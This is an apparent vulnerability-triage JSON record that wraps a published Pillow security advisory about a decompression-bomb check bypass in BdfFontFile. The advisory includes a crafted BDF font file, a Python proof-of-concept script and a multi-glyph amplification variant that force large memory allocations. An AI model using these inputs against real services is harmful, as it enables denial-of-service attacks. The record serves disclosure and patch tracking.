@@ -1,0 +1,59 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"author\": null, \"closed_at\": null, \"collaborating_teams\": null, \"collaborating_users\": null, \"created_at\": null, \"credits\": [{\"login\": \"x-forwarded-sudo\", \"type\": \"reporter\"}], \"credits_detailed\": [{\"state\": \"accepted\", \"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/223256873?v=4\", \"events_url\": \"https://api.github.com/users/x-forwarded-sudo/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/x-forwarded-sudo/followers\", \"following_url\": \"https://api.github.com/users/x-forwarded-sudo/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/x-forwarded-sudo/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/x-forwarded-sudo\", \"id\": 223256873, \"login\": \"x-forwarded-sudo\", \"node_id\": \"U_kgDODU6hKQ\", \"organizations_url\": \"https://api.github.com/users/x-forwarded-sudo/orgs\", \"received_events_url\": \"https://api.github.com/users/x-forwarded-sudo/received_events\", \"repos_url\": \"https://api.github.com/users/x-forwarded-sudo/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/x-forwarded-sudo/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/x-forwarded-sudo/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/x-forwarded-sudo\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-55379\", \"cvss\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\"}, \"cvss_v4\": {\"score\": null, \"vector_string\": null}}, \"cwe_ids\": [\"CWE-789\"], \"cwes\": [{\"cwe_id\": \"CWE-789\", \"name\": \"Memory Allocation with Excessive Size Value\"}], \"description\": \"### Summary\\r\\n`PIL/BdfFontFile.py` `bdf_char()` (lines 84–88) reads the `BBX width height` field from a BDF font file and passes the dimensions directly to `Image.new()` without calling `Image._decompression_bomb_check()`. This completely bypasses Pillow's documented decompression bomb protection.\\r\\n\\r\\n`Image.open()` enforces `MAX_IMAGE_PIXELS = 89,478,485` and raises `DecompressionBombError` for images exceeding `2 × MAX = 178,956,970` pixels. The BDF font loading path calls `Image.new()` directly, which only calls `_check_size()` (validates `>= 0`) — no pixel count limit.\\r\\n\\r\\n**Vulnerable code (`PIL/BdfFontFile.py` lines 84–88):**\\r\\n```python\\r\\n# width, height from attacker-controlled \\\"BBX width height x y\\\" line\\r\\ntry:\\r\\n    im = Image.frombytes(\\\"1\\\", (width, height), bitmap, \\\"hex\\\", \\\"1\\\")\\r\\nexcept ValueError:\\r\\n    # TRIGGERED when BITMAP section is empty (zero hex lines)\\r\\n    im = Image.new(\\\"1\\\", (width, height))   # ← NO _decompression_bomb_check()!\\r\\n    # ^ This image is stored in self.glyph[ch] — persists in memory\\r\\n```\\r\\n\\r\\n**Attack trigger:** A BDF glyph with `BBX 20000 20000` and an empty `BITMAP` section causes `Image.frombytes()` to raise `ValueError`, then `Image.new(\\\"1\\\", (20000, 20000))` allocates **50 MB** of C-heap silently. Image.open() would raise `DecompressionBombError` for the same dimensions.\\r\\n\\r\\n## Steps to reproduce\\r\\n\\r\\n**Minimal malicious BDF file (270 bytes):**\\r\\n```\\r\\nSTARTFONT 2.1\\r\\nSIZE 16 75 75\\r\\nFONTBOUNDINGBOX 16 16 0 -4\\r\\nSTARTPROPERTIES 1\\r\\nCOMMENT placeholder\\r\\nENDPROPERTIES\\r\\nCHARS 1\\r\\nSTARTCHAR A\\r\\nENCODING 65\\r\\nSWIDTH 500 0\\r\\nDWIDTH 8 0\\r\\nBBX 20000 20000 0 0\\r\\nBITMAP\\r\\nENDCHAR\\r\\nENDFONT\\r\\n```\\r\\n\\r\\n**Proof of Concept script:**\\r\\n```python\\r\\n#!/usr/bin/env python3\\r\\n\\\"\\\"\\\"PoC: BdfFontFile bomb bypass — 270-byte BDF → 50 MB allocation\\\"\\\"\\\"\\r\\nimport io, warnings\\r\\nwarnings.filterwarnings(\\\"ignore\\\")\\r\\n\\r\\nfrom PIL.BdfFontFile import BdfFontFile\\r\\nfrom PIL.Image import _decompression_bomb_check, DecompressionBombWarning, DecompressionBombError\\r\\n\\r\\nW, H = 20000, 20000   # 400M pixels → above DecompressionBombError threshold\\r\\n\\r\\n# Show what Image.open() would do\\r\\nwarnings.filterwarnings(\\\"error\\\", category=DecompressionBombWarning)\\r\\ntry:\\r\\n    _decompression_bomb_check((W, H))\\r\\nexcept (DecompressionBombWarning, DecompressionBombError) as e:\\r\\n    print(f\\\"[Image.open() path] BLOCKED by {type(e).__name__}\\\")\\r\\nwarnings.filterwarnings(\\\"ignore\\\")\\r\\n\\r\\n# Malicious BDF: large BBX + empty BITMAP → ValueError → Image.new() without bomb check\\r\\nbdf = f\\\"\\\"\\\"STARTFONT 2.1\\r\\nSIZE 16 75 75\\r\\nFONTBOUNDINGBOX 16 16 0 -4\\r\\nSTARTPROPERTIES 1\\r\\nCOMMENT x\\r\\nENDPROPERTIES\\r\\nCHARS 1\\r\\nSTARTCHAR A\\r\\nENCODING 65\\r\\nSWIDTH 500 0\\r\\nDWIDTH 8 0\\r\\nBBX {W} {H} 0 0\\r\\nBITMAP\\r\\nENDCHAR\\r\\nENDFONT\\r\\n\\\"\\\"\\\".encode()\\r\\n\\r\\nprint(f\\\"[*] BDF file size  : {len(bdf)} bytes\\\")\\r\\nprint(f\\\"[*] Glyph size     : {W} x {H} = {W*H:,} pixels\\\")\\r\\nprint(f\\\"[*] C-heap target  : {W*H//8//1024**2} MB  (mode '1' = 1 bit/pixel)\\\")\\r\\n\\r\\nBdfFontFile(io.BytesIO(bdf))   # No exception — bomb check bypassed!\\r\\n\\r\\nprint(f\\\"[!] CONFIRMED: BdfFontFile loaded silently — {W*H//8//1024**2} MB allocated\\\")\\r\\nprint(f\\\"    Image.open() path would have raised DecompressionBombError\\\")\\r\\n```\\r\\n\\r\\n**Expected output:**\\r\\n```\\r\\n[Image.open() path] BLOCKED by DecompressionBombError\\r\\n[*] BDF file size  : 270 bytes\\r\\n[*] Glyph size     : 20000 x 20000 = 400,000,000 pixels\\r\\n[*] C-heap target  : 47 MB  (mode '1' = 1 bit/pixel)\\r\\n[!] CONFIRMED: BdfFontFile loaded silently — 47 MB allocated\\r\\n    Image.open() path would have raised DecompressionBombError\\r\\n```\\r\\n\\r\\n**Amplified attack (multiple glyphs):**  \\r\\nA BDF file defining 256 glyphs each at `BBX 8000 8000` causes `256 × 7.6 MB = ~1.95 GB` total C-heap allocation — all silently, bypassing documented bomb protection.\\r\\n\\r\\n### Impact\\r\\n- **Availability**: HIGH — attacker-controlled memory allocation per glyph × up to 65,536 glyphs\\r\\n- **Confidentiality**: None  \\r\\n- **Integrity**: None\\r\\n- Any service loading BDF fonts from untrusted sources (e.g., `ImageFont.load(\\\"user.bdf\\\")`, `BdfFontFile(fp)`) is affected\\r\\n- Loaded glyph images persist in `self.glyph[ch]` for the lifetime of the font object — memory is NOT freed until the font is garbage collected\\r\\n\\r\\n\\r\\n\", \"ghsa_id\": \"GHSA-45hq-cxwh-f6vc\", \"html_url\": \"https://github.com/python-pillow/Pillow/security/advisories/GHSA-45hq-cxwh-f6vc\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-45hq-cxwh-f6vc\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-55379\"}], \"private_fork\": null, \"published_at\": \"2026-07-03T08:33:16Z\", \"publisher\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/3112309?v=4\", \"events_url\": \"https://api.github.com/users/radarhere/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/radarhere/followers\", \"following_url\": \"https://api.github.com/users/radarhere/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/radarhere/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/radarhere\", \"id\": 3112309, \"login\": \"radarhere\", \"node_id\": \"MDQ6VXNlcjMxMTIzMDk=\", \"organizations_url\": \"https://api.github.com/users/radarhere/orgs\", \"received_events_url\": \"https://api.github.com/users/radarhere/received_events\", \"repos_url\": \"https://api.github.com/users/radarhere/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/radarhere/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/radarhere/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/radarhere\", \"user_view_type\": \"public\"}, \"severity\": \"high\", \"state\": \"published\", \"submission\": null, \"summary\": \"BdfFontFile`: `Image.new()` called without `_decompression_bomb_check()` — bomb protection bypass via font loading\", \"updated_at\": \"2026-07-07T21:56:19Z\", \"url\": \"https://api.github.com/repos/python-pillow/Pillow/security-advisories/GHSA-45hq-cxwh-f6vc\", \"vulnerabilities\": [{\"package\": {\"ecosystem\": \"pip\", \"name\": \"Pillow\"}, \"patched_versions\": \">= 12.3.0\", \"vulnerable_functions\": [], \"vulnerable_version_range\": \"≤ 12.2.0\"}], \"withdrawn_at\": null}",
+  "canonical_id": "pillow:ghsa-45hq-cxwh-f6vc",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "Pillow: ≤ 12.2.0"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-55379"
+    ],
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+    "fixed_versions": [
+      "Pillow: >= 12.3.0"
+    ],
+    "mitigations": [],
+    "products": [
+      "Pillow"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-17T23:40:05.727130Z",
+  "provenance": {
+    "content_sha256": "145a17f3b6edd04492f374bb3580fcda32854f51ca5330a558f2e2c520d7bf5e",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-07-03T08:33:16Z",
+  "schema_version": 1,
+  "source_id": "pillow_github",
+  "source_url": "https://github.com/python-pillow/Pillow/security/advisories/GHSA-45hq-cxwh-f6vc",
+  "status": "active",
+  "title": "BdfFontFile`: `Image.new()` called without `_decompression_bomb_check()` — bomb protection bypass via font loading",
+  "updated_at": "2026-07-07T21:56:19Z",
+  "vendor": "Pillow",
+  "vendor_advisory_id": "GHSA-45hq-cxwh-f6vc"
+}
